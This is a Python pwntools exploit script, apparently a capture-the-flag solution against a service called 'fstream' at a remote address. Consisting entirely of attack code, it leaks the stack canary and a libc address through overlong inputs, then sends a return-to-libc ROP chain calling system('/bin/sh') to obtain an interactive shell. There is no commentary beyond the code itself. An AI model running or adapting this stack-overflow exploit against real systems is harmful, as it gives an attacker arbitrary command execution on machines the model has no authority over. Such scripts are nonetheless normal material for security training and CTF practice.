from pwn import *

libc = ELF('libc6_2.23-0ubuntu10_amd64.so')

context.log_level = 'debug'

r = remote('178.62.40.102', 6002)
# r = process('./fstream')

OFFSET_RET_FROM_MAIN = 0x20830
OFFSET_BIN_SH = 0x18cd57
ADDR_POP_RDI = 0x400cc3

r.sendlineafter('> ', '11010110')
r.sendlineafter('> ', 'A' * 0x88)

r.recvline()
CANARY_STR = '\x00' + r.recv(7)

log.info(hex(u64(CANARY_STR)))

r.sendlineafter('> ', 'A' * 0x97)

r.recvline()
LIBC_BASE = u64(r.recv(6) + '\x00\x00') - OFFSET_RET_FROM_MAIN

log.info(hex(LIBC_BASE))

payload = ''
payload += 'A' * 0x88
payload += CANARY_STR
payload += 'A' * 0x8
payload += p64(ADDR_POP_RDI)
payload += p64(LIBC_BASE + OFFSET_BIN_SH)
payload += p64(LIBC_BASE + libc.symbols['system'])

r.sendlineafter('> ', payload)
r.sendlineafter('> ', '11111111')

r.interactive()
